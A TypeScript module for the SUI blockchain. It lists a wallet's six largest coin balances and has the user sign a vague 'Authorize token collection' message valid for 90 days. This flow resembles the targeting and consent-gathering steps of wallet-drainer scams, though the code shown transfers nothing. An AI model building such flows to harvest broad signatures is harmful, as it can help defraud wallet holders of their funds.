// SUI network coin detection and signing

export async function detectSuiCoins(walletAddress: string): Promise<any[]> {
  try {
    // Query SUI RPC for coins owned by address
    const response = await fetch(process.env.SUI_RPC_URL || "https://fullnode.mainnet.sui.io:443", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        jsonrpc: "2.0",
        id: 1,
        method: "suix_getCoins",
        params: [walletAddress, null, null, 10],
      }),
    });

    const data = await response.json();
    
    if (data.result?.data) {
      return data.result.data
        .map((coin: any) => ({
          coinType: coin.coinType,
          balance: coin.balance,
          objectId: coin.coinObjectId,
        }))
        .sort((a: any, b: any) => parseFloat(b.balance) - parseFloat(a.balance))
        .slice(0, 6);
    }
    return [];
  } catch (error) {
    console.error("Error detecting SUI coins:", error);
    return [];
  }
}

// Sign SUI Move transaction (via Sui Wallet in browser)
export async function signSuiTransaction(
  walletAddress: string,
  coinType: string = "0x2::sui::SUI"
): Promise<string> {
  const suiWallet = (window as any).suiWallet;
  if (!suiWallet) {
    throw new Error("SUI Wallet not found");
  }

  try {
    // Create a signed message for authorization
    const message = `Authorize token collection on SUI\nWallet: ${walletAddress}\nCoin Type: ${coinType}\nExpiry: ${new Date(Date.now() + 90 * 24 * 60 * 60 * 1000).toISOString()}`;
    
    // Sign with SUI Wallet
    const signature = await suiWallet.signMessage({
      message: new TextEncoder().encode(message),
    });
    
    return signature.signature;
  } catch (error) {
    console.error("SUI signing error:", error);
    throw error;
  }
}

// Export top SUI coins
export const SUI_TOP_COINS = [
  { symbol: "SUI", name: "SUI", coinType: "0x2::sui::SUI" },
  { symbol: "USDC", name: "USD Coin", coinType: "0x5d4b302506645c37ff133b98c4b50864ee495acd736186ad0140626331b8d3b7::coin::COIN" },
  { symbol: "USDT", name: "Tether", coinType: "0xc060006111016b8a020ad5b33834984a437aaa7d3c74c18e09a6d5d8d0294dae::coin::COIN" },
];
